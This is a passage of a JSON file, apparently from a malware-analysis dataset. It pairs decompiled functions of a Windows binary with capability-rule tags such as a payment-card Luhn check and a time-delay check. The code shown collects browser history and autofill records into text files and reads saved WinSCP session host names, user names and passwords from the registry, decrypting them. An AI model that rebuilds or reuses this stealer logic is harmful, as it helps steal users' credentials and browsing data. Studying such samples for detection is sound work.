        "decompiled_code": "\nvoid __cdecl fcn.0040fc0d(uint *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    char *pcVar9;\n    uint *arg_8h_00;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint *var_224h;\n    uint *var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    var_220h = arg_8h;\n    fcn.004257d0(&var_218h, 0, 0x104);\n    (**0x4464ac)(&var_218h, *0x446038);\n    uVar1 = fcn.00416673();\n    (**0x4464ac)(&var_218h, uVar1);\n    (**0x446354)();\n    fcn.004257d0(&var_110h, 0, 0x104);\n    (**0x4464ac)(&var_110h, 0x43bd7c);\n    (**0x4464ac)(&var_110h, *0x4460a4);\n    (**0x4464ac)(&var_110h, 0x43bd7c);\n    (**0x4464ac)(&var_110h, var_220h);\n    (**0x4464ac)(&var_110h, 0x43e4fc);\n    arg_8h_00 = &var_110h;\n    (**0x4464ac)();\n    (**0x4464ac)(&var_110h, \".txt\");\n    uVar1 = *0x445bec;\n    iVar2 = (**0x4462d0)(&var_218h, &var_228h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446280)(var_228h, uVar1, 0xffffffff, &var_21ch, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x446508)(0, 999999);\n            uVar1 = (**0x446490)(uVar1);\n            iVar2 = (**0x44629c)(var_21ch);\n            while (iVar2 == 100) {\n                uVar3 = (**0x4462bc)(var_21ch, 0);\n                puVar4 = (**0x4462bc)(var_21ch, 1);\n                var_220h = puVar4;\n                uVar5 = (**0x4462bc)(var_21ch, 2);\n                var_224h = (**0x4462bc)(var_21ch, 3);\n                uVar6 = (**0x4462bc)(var_21ch, 4);\n                uVar7 = (**0x4462bc)(var_21ch, 5);\n                uVar8 = (**0x4462bc)(var_21ch, 6);\n                iVar2 = (**0x4464dc)(puVar4, 0x43df58);\n                if (iVar2 == 0) {\n                    pcVar9 = \"TRUE\";\n                }\n                else {\n                    pcVar9 = \"FALSE\";\n                }\n                *puVar4 = 0;\n                (**0x4464ac)(var_220h, pcVar9);\n                puVar4 = var_224h;\n                iVar2 = (**0x4464dc)(var_224h, 0x43df58);\n                if (iVar2 == 0) {\n                    pcVar9 = \"TRUE\";\n                }\n                else {\n                    pcVar9 = \"FALSE\";\n                }\n                *puVar4 = 0;\n                (**0x4464ac)(var_224h, pcVar9);\n                (**0x4464ac)(uVar1, uVar3);\n                (**0x4464ac)(uVar1, 0x43e500);\n                (**0x4464ac)(uVar1, var_220h);\n                (**0x4464ac)(uVar1, 0x43e500);\n                (**0x4464ac)(uVar1, uVar5);\n                (**0x4464ac)(uVar1, 0x43e500);\n                (**0x4464ac)(uVar1, var_224h);\n                (**0x4464ac)(uVar1, 0x43e500);\n                (**0x4464ac)(uVar1, uVar6);\n                (**0x4464ac)(uVar1, 0x43e500);\n                (**0x4464ac)(uVar1, uVar7);\n                (**0x4464ac)(uVar1, 0x43e500);\n                (**0x4464ac)(uVar1, uVar8);\n                (**0x4464ac)(uVar1, 0x43bd78);\n                iVar2 = (**0x44629c)(var_21ch);\n            }\n            uVar1 = (**0x4463a4)(uVar1);\n            fcn.0041d4dc(&var_110h, uVar1, 3);\n        }\n        (**0x4462a0)(var_21ch);\n        (**0x4462d4)(var_228h);\n    }\n    (**0x4463b0)(&var_218h);\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 1304
    },
    "0040ff7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff7c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *arg_8h_00;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    fcn.004257d0(&var_110h, 0, 0x104);\n    (**0x4464ac)(&var_110h, *0x446038);\n    uVar1 = fcn.00416673();\n    (**0x4464ac)(&var_110h, uVar1);\n    arg_8h_00 = &var_110h;\n    (**0x446354)();\n    fcn.004257d0(&var_218h, 0, 0x104);\n    (**0x446300)(&var_218h, \"\\\\History\\\\%s_%s.txt\", arg_ch, arg_8h);\n    uVar1 = *0x445cac;\n    iVar2 = (**0x4462d0)(&var_110h, &var_220h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446280)(var_220h, uVar1, 0xffffffff, &var_21ch, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x446508)(0, 999999);\n            uVar1 = (**0x446490)(uVar1);\n            while( true ) {\n                iVar2 = (**0x44629c)(var_21ch);\n                if (iVar2 != 100) break;\n                uVar3 = (**0x4462bc)(var_21ch, 0);\n                (**0x4464ac)(uVar1, uVar3);\n                (**0x4464ac)(uVar1, 0x43bd78);\n            }\n            uVar1 = (**0x4463a4)(uVar1);\n            fcn.0041d4dc(&var_218h, uVar1, 3);\n        }\n        (**0x4462a0)(var_21ch);\n        (**0x4462d4)(var_220h);\n    }\n    (**0x4463b0)(&var_110h);\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 596
    },
    "00410111": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410111(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    var_220h = arg_ch;\n    fcn.004257d0(&var_110h, 0, 0x104);\n    (**0x4464ac)(&var_110h, *0x446038);\n    uVar1 = fcn.00416673();\n    (**0x4464ac)(&var_110h, uVar1);\n    arg_8h_00 = 1;\n    (**0x446354)();\n    fcn.004257d0(&var_218h, 0, 0x104);\n    (**0x446300)(&var_218h, \"\\\\Autofill\\\\%s_%s.txt\", var_220h, arg_8h);\n    uVar1 = *0x445a84;\n    iVar2 = (**0x4462d0)(&var_110h, &var_224h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446280)(var_224h, uVar1, 0xffffffff, &var_21ch, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x446508)(0, 999999);\n            uVar1 = (**0x446490)(uVar1);\n            while( true ) {\n                iVar2 = (**0x44629c)(var_21ch);\n                if (iVar2 != 100) break;\n                uVar3 = (**0x4462bc)(var_21ch, 0);\n                var_220h = (**0x4462bc)(var_21ch, 1);\n                (**0x4464ac)(uVar1, uVar3);\n                (**0x4464ac)(uVar1, 0x43e500);\n                (**0x4464ac)(uVar1, var_220h);\n                (**0x4464ac)(uVar1, 0x43bd78);\n            }\n            uVar1 = (**0x4463a4)(uVar1);\n            fcn.0041d4dc(&var_218h, uVar1, 3);\n        }\n        (**0x4462a0)(var_21ch);\n        (**0x4462d4)(var_224h);\n    }\n    (**0x4463b0)(&var_110h);\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 661
    },
    "00410de5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h_4\n\nvoid __cdecl\nfcn.00410de5(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_4h_3;\n    uint var_4h_2;\n    uint var_4h;\n    uint var_8c4h_3;\n    uint var_8bch_3;\n    uint var_8ach_3;\n    uint var_8a8h_2;\n    uint var_8c4h_2;\n    uint var_8c0h_3;\n    uint var_8bch_2;\n    uint var_8b8h_2;\n    uint var_8b4h;\n    uint var_8ach_2;\n    uint var_8a8h;\n    uint var_8c0h_2;\n    uint var_8bch;\n    uint var_8b8h;\n    uint var_8ach;\n    uint var_870h;\n    uint var_854h;\n    uint var_8c4h;\n    uint var_8c0h;\n    uint var_838h;\n    uint var_7f4h_2;\n    uint var_81ch_2;\n    uint var_800h;\n    uint var_7f4h;\n    uint var_7f0h;\n    uint var_7e4h_3;\n    uint var_7e4h_2;\n    uint var_81ch;\n    uint var_80ch;\n    uint var_808h;\n    uint var_7e4h;\n    uint var_3fch;\n    uint32_t uStack116;\n    uchar auStack84 [16];\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    int32_t iStack40;\n    uint var_4h_4;\n    \n    fcn.004208fe();\n    *(unaff_EBP + -0x8c4) = *(unaff_EBP + 8);\n    fcn.00416c79(0x1a);\n    *(unaff_EBP + -0x808) = 0xf;\n    *(unaff_EBP + -0x80c) = 0;\n    *(unaff_EBP + -0x81c) = 0;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 0;\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.00416c79(0x1a);\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    iStack40 = 0x410e95;\n    fcn.00416c79(0x1a);\n    iStack40 = unaff_EBP + -0x7e4;\n    uStack44 = 0x410ea4;\n    (**0x4464ac)();\n    uStack44 = *0x445fa0;\n    iStack48 = unaff_EBP + -0x7e4;\n    uStack52 = 0x410eb7;\n    (**0x4464ac)();\n    uStack52 = 0x43e454;\n    iStack56 = unaff_EBP + -0x7e4;\n    uStack60 = 0x410ec9;\n    (**0x4464ac)();\n    iVar3 = unaff_EBP + -0x3fc;\n    *(unaff_EBP + -0x8c0) = &stack0xffffffac;\n    uStack64 = 0xf;\n    uStack68 = 0;\n    auStack84[0] = 0;\n    fcn.00403f50();\n    fcn.00416a28(iVar3);\n    *(unaff_EBP + -4) = 1;\n    iVar3 = *(unaff_EBP + -0x8bc);\n    *(unaff_EBP + -0x8ac) = *(unaff_EBP + -0x8b8);\n    if (iVar3 != *(unaff_EBP + -0x8b8)) {\n        do {\n            fcn.0040d466();\n            *(unaff_EBP + -4) = 2;\n            fcn.004167f9(unaff_EBP + -0x88c);\n            *(unaff_EBP + -4) = 3;\n            fcn.0040c1db(unaff_EBP + -0x870, *0x445e14);\n            *(unaff_EBP + -4) = 4;\n            fcn.004042ed();\n            *(unaff_EBP + -4) = 5;\n            uVar1 = fcn.004167f9(unaff_EBP + -0x8a8);\n            *(unaff_EBP + -4) = 6;\n            uStack116 = 0x410f95;\n            fcn.004042b6(unaff_EBP + -0x838, *0x445c78, uVar1);\n            *(unaff_EBP + -4) = 7;\n            fcn.0041d50d();\n            fcn.00403f73();\n            uStack116 = 1;\n            fcn.00403f73();\n            fcn.00403f73(1, 0);\n            fcn.00403f73(1, 0);\n            fcn.00403f73(1, 0);\n            *(unaff_EBP + -4) = 1;\n            fcn.0040c0f0();\n            iVar3 = iVar3 + 0x1c;\n        } while (iVar3 != *(unaff_EBP + -0x8ac));\n    }\n    iVar3 = unaff_EBP + -0x7e4;\n    *(unaff_EBP + -0x8c0) = &stack0xffffff8c;\n    uStack116 = uStack116 & 0xffffff00;\n    fcn.00403f50();\n    puVar2 = fcn.00416a28(iVar3);\n    if (unaff_EBP + -0x8bc != puVar2) {\n        fcn.0040d526();\n        *(unaff_EBP + -0x8bc) = *puVar2;\n        *(unaff_EBP + -0x8b8) = puVar2[1];\n        *(unaff_EBP + -0x8b4) = puVar2[2];\n        *puVar2 = 0;\n        puVar2[1] = 0;\n        puVar2[2] = 0;\n    }\n    *(unaff_EBP + -4) = 1;\n    if (*(unaff_EBP + -0x7f4) != 0) {\n        fcn.0040d5fa(*(unaff_EBP + -0x7f0));\n        fcn.0041e801(*(unaff_EBP + -0x7f4));\n    }\n    *(unaff_EBP + -0x8c0) = *(unaff_EBP + -0x8b8);\n    *(unaff_EBP + -0x8ac) = *(unaff_EBP + -0x8bc);\n    if (*(unaff_EBP + -0x8bc) != *(unaff_EBP + -0x8b8)) {\n        do {\n            fcn.0040d466(*(unaff_EBP + -0x8ac));\n            *(unaff_EBP + -4) = 9;\n            fcn.004167f9(unaff_EBP + -0x838);\n            *(unaff_EBP + -4) = 10;\n            fcn.0040c1db(unaff_EBP + -0x8a8, *0x445fa0);\n            *(unaff_EBP + -4) = 0xb;\n            fcn.004042ed();\n            *(unaff_EBP + -4) = 0xc;\n            uVar1 = fcn.004167f9(unaff_EBP + -0x870);\n            *(unaff_EBP + -4) = 0xd;\n            puVar2 = fcn.004042b6(unaff_EBP + -0x88c, *0x445ce8, uVar1);\n            *(unaff_EBP + -4) = 0xe;\n            if (0xf < puVar2[5]) {\n                puVar2 = *puVar2;\n            }\n            fcn.0041d50d(puVar2);\n            fcn.00403f73(1, 0);\n            fcn.00403f73(1, 0);\n            fcn.00403f73(1, 0);\n            fcn.00403f73(1, 0);\n            fcn.00403f73(1, 0);\n            *(unaff_EBP + -4) = 1;\n            fcn.0040c0f0();\n            *(unaff_EBP + -0x8ac) = *(unaff_EBP + -0x8ac) + 0x1c;\n        } while (*(unaff_EBP + -0x8ac) != *(unaff_EBP + -0x8c0));\n    }\n    if (*(unaff_EBP + -0x8bc) != 0) {\n        fcn.0040d5fa(*(unaff_EBP + -0x8b8));\n        fcn.0041e801(*(unaff_EBP + -0x8bc));\n    }\n    *(unaff_EBP + -0x8bc) = 0;\n    *(unaff_EBP + -0x8b8) = 0;\n    *(unaff_EBP + -0x8b4) = 0;\n    fcn.00403f73(1, 0);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 2502
    },
    "00411578": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411578(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_10h;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint arg_8h;\n    uchar *extraout_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iStack140;\n    int32_t iStack136;\n    uint uStack132;\n    uint uStack120;\n    uchar auStack92 [16];\n    uint uStack76;\n    uint uStack72;\n    uchar auStack64 [16];\n    uint uStack48;\n    uint uStack44;\n    uchar auStack36 [16];\n    uint uStack20;\n    uint uStack16;\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ &stack0xffffff88;\n    uStack120 = 0x24;\n    fcn.00420895();\n    iStack136 = 0;\n    iStack140 = 0;\n    uStack16 = 0xf;\n    uStack20 = 0;\n    auStack36[0] = 0;\n    uStack44 = 0xf;\n    uStack48 = 0;\n    auStack64[0] = 0;\n    uStack132 = 0x4115de;\n    fcn.00411465(arg_8h, CONCAT31(&stack0xffffff74 >> 8, 1));\n    uStack132 = iStack140;\n    iStack136 = 8;\n    iStack140 = 0x4115ec;\n    iStack140 = (**0x446508)();\n    iVar1 = (**0x446490)();\n    puVar5 = extraout_EDX;\n    if (iVar1 == 0) {\ncode_r0x004115f9:\n        if (iStack136 != 0) {\ncode_r0x00411601:\n            uVar2 = (**0x446508)(0, iStack136);\n            (**0x446534)(uVar2);\n        }\n    }\n    else {\n        iVar8 = 0x411650;\n        fcn.0041e7a2(iVar1, iStack140, iStack136);\n        if (iStack136 != 0) {\n            uVar2 = (**0x446508)(0, iStack136);\n            iVar8 = 0x411669;\n            (**0x446534)(uVar2);\n            iStack136 = 0;\n        }\n        if (iVar8 == 0xff) {\n            fcn.00411465(iVar1, &stack0xffffff74);\n            uVar2 = (**0x446508)(0, iVar1);\n            (**0x446534)(uVar2);\n            uVar2 = (**0x446508)(8, iStack140);\n            iVar1 = (**0x446490)(uVar2);\n            if (iVar1 != 0) {\n                fcn.0041e7a2(iVar1, iStack140, iStack136);\n                if (iStack136 != 0) {\n                    uVar2 = (**0x446508)(0, iStack136);\n                    (**0x446534)(uVar2);\n                    iStack136 = 0;\n                }\n                fcn.00411465(iVar1, &stack0xffffff74);\n                uVar2 = (**0x446508)(0, iVar1);\n                (**0x446534)(uVar2);\n                uVar2 = (**0x446508)(8, iStack140);\n                iVar1 = (**0x446490)(uVar2);\n                if (iVar1 != 0) {\n                    fcn.0041e7a2(iVar1, iStack140, iStack136);\n                    if (iStack136 != 0) {\n                        uVar2 = (**0x446508)(0, iStack136);\n                        (**0x446534)(uVar2);\n                        iStack136 = 0;\n                    }\n                    goto code_r0x00411742;\n                }\n            }\n            goto code_r0x004115f9;\n        }\ncode_r0x00411742:\n        iVar8 = iVar1;\n        iVar3 = fcn.00411465(iVar1, &stack0xffffff74);\n        uVar2 = (**0x446508)(0, iVar1, iVar8, iVar3 * 2);\n        (**0x446534)(uVar2);\n        uVar2 = (**0x446508)(8, iStack140);\n        iVar1 = (**0x446490)(uVar2);\n        if (iVar1 == 0) goto code_r0x004115f9;\n        fcn.0041e7a2(iVar1, iStack140, iStack136);\n        if (iStack136 != 0) {\n            uVar2 = (**0x446508)(0, iStack136);\n            (**0x446534)(uVar2);\n        }\n        iVar8 = iVar1;\n        iStack140 = (**0x4463a4)();\n        iStack140 = iStack140 + (1 - iVar8);\n        uVar2 = (**0x446508)(8, iStack140);\n        iStack136 = (**0x446490)(uVar2);\n        if (iStack136 != 0) {\n            uStack72 = 0xf;\n            uStack76 = 0;\n            auStack92[0] = 0;\n            iVar8 = iVar1;\n            fcn.00403f50();\n            uVar2 = (**0x4463a4)(iVar1);\n            puVar4 = &stack0xffffffa4;\n            arg_10h = fcn.0040bfdc(puVar4, iVar8, uVar2);\n            if (0xf < arg_10h[5]) {\n                arg_10h = *arg_10h;\n            }\n            fcn.0041e7a2(iStack136, iStack140, arg_10h);\n            uVar6 = 0;\n            iVar8 = 1;\n            fcn.00403f73(1, 0);\n            fcn.00403f73(1, 0);\n            uVar2 = (**0x446508)(0, iVar1);\n            (**0x446534)(uVar2);\n            iVar1 = (**0x4463a4)(iStack136);\n            iVar1 = iVar1 + 1;\n            iStack140 = iVar1;\n            uVar2 = (**0x446508)(8, iVar1);\n            iVar3 = (**0x446490)(uVar2);\n            if (iVar3 != 0) {\n                fcn.0041e7a2(iVar3, iVar1, iStack136);\n                iVar3 = 0;\n                uVar2 = (**0x446508)(0, iStack136);\n                iVar9 = 0x41188f;\n                (**0x446534)(uVar2);\n                iStack136 = 0;\n                iVar1 = 0;\n                if (0 < puVar4) {\n                    do {\n                        puVar4 = &stack0xffffff74;\n                        iVar1 = fcn.00411465(puVar4, puVar4);\n                        iVar7 = 0;\n                        uVar6 = (**0x446508)(0, puVar4);\n                        (**0x446534)(uVar6);\n                        iVar8 = iStack140;\n                        uVar2 = (**0x446508)(8, iStack140);\n                        puVar4 = (**0x446490)(uVar2);\n                        if (puVar4 == NULL) goto code_r0x004115f9;\n                        iVar9 = 0x4118e9;\n                        fcn.0041e7a2(puVar4, iStack140, iStack136);\n                        puVar5 = puVar4;\n                        if (iStack136 != 0) {\n                            puVar5 = (**0x446508)(0, iStack136);\n                            iVar9 = 0x411902;\n                            (**0x446534)();\n                            iStack136 = 0;\n                        }\n                        iVar3 = 0x411911;\n                        fcn.0040c377();\n                        iVar1 = iVar1 + 1;\n                    } while (iVar1 < iVar7);\n                }\n                if (iVar9 == 0xff) {\n                    uStack72 = 0xf;\n                    uStack76 = 0;\n                    auStack92[0] = 0;\n                    fcn.00403f50(iVar8);\n                    fcn.00403f0c();\n                    puVar5 = NULL;\n                    fcn.00403f73(1);\n                    fcn.0040c23f(&stack0xffffffc0, uVar6);\n                    fcn.0040bfdc(&stack0xffffffdc, uStack48, uStack20);\n                    fcn.00403f0c();\n                    fcn.00403f73(1, 0);\n                    iVar3 = iVar8;\n                }\n                uVar2 = (**0x446508)(0, iVar3);\n                (**0x446534)(uVar2);\n                *(puVar5 + 0x14) = 0xf;\n                *(puVar5 + 0x10) = 0;\n                *puVar5 = 0;\n                fcn.00403f0c();\n                fcn.00403f73(1, 0);\n                fcn.00403f73(1, 0);\n                goto code_r0x004119dd;\n            }\n            goto code_r0x00411601;\n        }\n    }\n    *(puVar5 + 0x14) = 0xf;\n    *(puVar5 + 0x10) = 0;\n    iVar1 = 0x43bd76;\n    *puVar5 = 0;\n    fcn.00403f50();\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\ncode_r0x004119dd:\n    *in_FS_OFFSET = uStack132;\n    fcn.0041e0a1(iVar1);\n    return;\n}\n",
        "token_count": 2240
    },
    "004119fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_11bh\n\nvoid __cdecl fcn.004119fc(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t unaff_EBP;\n    uint uVar5;\n    uint var_df4h;\n    uint var_df0h;\n    uint var_dech;\n    uint var_de8h;\n    uint var_de4h;\n    uint var_de0h;\n    uint var_ddch;\n    uint var_dd8h;\n    uint var_dd4h;\n    uint var_dd0h;\n    uint var_dc8h;\n    uint var_dc4h;\n    uint var_da8h;\n    uint var_d8ch;\n    uint var_d70h;\n    uint var_d60h;\n    uint var_d5ch;\n    uint var_d54h;\n    uint var_d44h;\n    uint var_d40h;\n    uint var_d38h;\n    uint var_d28h;\n    uint var_d24h;\n    uint var_d1ch;\n    uint var_91ch;\n    uint var_51ch;\n    uint var_11bh;\n    uint var_4h;\n    \n    fcn.004208fe(0xde8);\n    *(unaff_EBP + -0xdd0) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0xdd4) = 0;\n    *(unaff_EBP + -0x11c) = 0;\n    fcn.004257d0(unaff_EBP + -0x11b, 0, 0x103);\n    *(unaff_EBP + -0xdd8) = 0x104;\n    fcn.004257d0(unaff_EBP + -0xd1c, 0, 0x400);\n    fcn.004257d0(unaff_EBP + -0x91c, 0, 0x400);\n    fcn.004257d0(unaff_EBP + -0x51c, 0, 0x400);\n    *(unaff_EBP + -0xde0) = 0x400;\n    *(unaff_EBP + -0xdec) = 0x400;\n    *(unaff_EBP + -0xddc) = 0x400;\n    iVar2 = (**0x446538)(0x80000001, L\"Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Configuration\", 0, 1, unaff_EBP + -0xdc8);\n    uVar5 = *0x446060;\n    if (iVar2 != 0) goto code_r0x00411ecf;\n    *(unaff_EBP + -0xd5c) = 0xf;\n    *(unaff_EBP + -0xd60) = 0;\n    *(unaff_EBP + -0xd70) = 0;\n    fcn.00403f50(uVar5);\n    *(unaff_EBP + -4) = 0;\n    uVar5 = *0x446224;\n    *(unaff_EBP + -0xd40) = 0xf;\n    *(unaff_EBP + -0xd44) = 0;\n    *(unaff_EBP + -0xd54) = 0;\n    fcn.00403f50(uVar5);\n    *(unaff_EBP + -4) = 1;\n    puVar3 = fcn.00416865(unaff_EBP + -0xd8c);\n    *(unaff_EBP + -4) = 2;\n    puVar4 = fcn.00416865(unaff_EBP + -0xdc4);\n    *(unaff_EBP + -4) = 3;\n    if (7 < puVar3[5]) {\n        puVar3 = *puVar3;\n    }\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    iVar2 = (**0x4462f4)(*(unaff_EBP + -0xdc8), puVar4, puVar3, 0x10, 0, unaff_EBP + -0xde8, unaff_EBP + -0xdf4);\n    *(unaff_EBP + -0xdc9) = iVar2 != 0;\n    fcn.0040c0f0(1);\n    fcn.0040c0f0(1);\n    fcn.00403f73(1, 0);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00403f73(1, 0);\n    if ((*(unaff_EBP + -0xdc9) != '\\0') && (*(unaff_EBP + -0xdc8) != 0)) {\n        (**0x44645c)(*(unaff_EBP + -0xdc8));\n        *(unaff_EBP + -0xdc8) = 0;\n    }\n    if (*(unaff_EBP + -0xde8) == 0) {\ncode_r0x00411be3:\n        if (*(unaff_EBP + -0xdc8) != 0) {\n            (**0x44645c)(*(unaff_EBP + -0xdc8));\n            *(unaff_EBP + -0xdc8) = 0;\n        }\n    }\n    else if (*(unaff_EBP + -0xdc8) != 0) {\n        (**0x44645c)(*(unaff_EBP + -0xdc8));\n        *(unaff_EBP + -0xdc8) = 0;\n        goto code_r0x00411be3;\n    }\n    iVar2 = (**0x446538)(0x80000001, L\"Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions\", 0, 9, unaff_EBP + -0xdc8);\n    if (iVar2 == 0) {\n        iVar2 = (**0x446500)(*(unaff_EBP + -0xdc8), 0, unaff_EBP + -0x11c, unaff_EBP + -0xdd8, 0, 0, 0, 0);\n        if (iVar2 == 0) {\n            do {\n                uVar5 = *(unaff_EBP + -0xdd0);\n                (**0x4464ac)(uVar5, 0x43bd78);\n                (**0x4464ac)(uVar5, *0x445c04);\n                (**0x4464ac)(uVar5, 0x43bd78);\n                (**0x4464ac)(uVar5, *0x446178);\n                (**0x446394)(*(unaff_EBP + -0xdc8), unaff_EBP + -0x11c, *0x445b64, 2, 0, unaff_EBP + -0xd1c, \n                             unaff_EBP + -0xde0);\n                (**0x4464ac)(uVar5, unaff_EBP + -0xd1c);\n                uVar1 = *0x445cbc;\n                *(unaff_EBP + -0xde4) = 4;\n                iVar2 = (**0x446394)(*(unaff_EBP + -0xdc8), unaff_EBP + -0x11c, uVar1, 0xffff, 0, unaff_EBP + -0xdf0, \n                                     unaff_EBP + -0xde4);\n                if (iVar2 == 0) {\n                    puVar3 = fcn.004166c2(*(unaff_EBP + -0xdf0));\n                    *(unaff_EBP + -4) = 4;\n                    if (0xf < puVar3[5]) {\n                        puVar3 = *puVar3;\n                    }\n                    (**0x4464ac)(uVar5, puVar3);\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    fcn.00403f73(1, 0);\n                }\n                else {\n                    (**0x4464ac)(uVar5, 0x43e64c);\n                }\n                (**0x4464ac)(uVar5, 0x43bd78);\n                (**0x4464ac)(uVar5, *0x445c5c);\n                (**0x446394)(*(unaff_EBP + -0xdc8), unaff_EBP + -0x11c, *0x4461f4, 2, 0, unaff_EBP + -0x91c, \n                             unaff_EBP + -0xdec);\n                (**0x4464ac)(uVar5, unaff_EBP + -0x91c);\n                *(unaff_EBP + -0xd24) = 0xf;\n                *(unaff_EBP + -0xd28) = 0;\n                *(unaff_EBP + -0xd38) = 0;\n                *(unaff_EBP + -4) = 5;\n                (**0x446394)(*(unaff_EBP + -0xdc8), unaff_EBP + -0x11c, *0x445dd8, 2, 0, unaff_EBP + -0x51c, \n                             unaff_EBP + -0xddc);\n                (**0x4464ac)(uVar5, 0x43bd78);\n                (**0x4464ac)(uVar5, *0x446138);\n                iVar2 = (**0x4464dc)(unaff_EBP + -0x51c, 0x43bd76);\n                if (iVar2 != 0) {\n                    fcn.00411578(unaff_EBP + -0xd1c, unaff_EBP + -0x91c);\n                    *(unaff_EBP + -4) = 6;\n                    fcn.00403f0c();\n                    *(unaff_EBP + -4) = 5;\n                    fcn.00403f73(1, 0);\n                    iVar2 = *(unaff_EBP + -0xd38);\n                    if (*(unaff_EBP + -0xd24) < 0x10) {\n                        iVar2 = unaff_EBP + -0xd38;\n                    }\n                    (**0x4464ac)(*(unaff_EBP + -0xdd0), iVar2);\n                    uVar5 = *(unaff_EBP + -0xdd0);\n                }\n                (**0x4464ac)(uVar5, 0x43e104);\n                *(unaff_EBP + -0xdd4) = *(unaff_EBP + -0xdd4) + 1;\n                *(unaff_EBP + -0xdd8) = 0x104;\n                iVar2 = (**0x446500)(*(unaff_EBP + -0xdc8), *(unaff_EBP + -0xdd4), unaff_EBP + -0x11c, \n                                     unaff_EBP + -0xdd8, 0, 0, 0, 0);\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.00403f73(1, 0);\n            } while (iVar2 != 0x103);\n        }\n        if (*(unaff_EBP + -0xdc8) != 0) {\n            (**0x44645c)(*(unaff_EBP + -0xdc8));\n        }\n    }\ncode_r0x00411ecf:\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 2548
    },
    "00413372": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
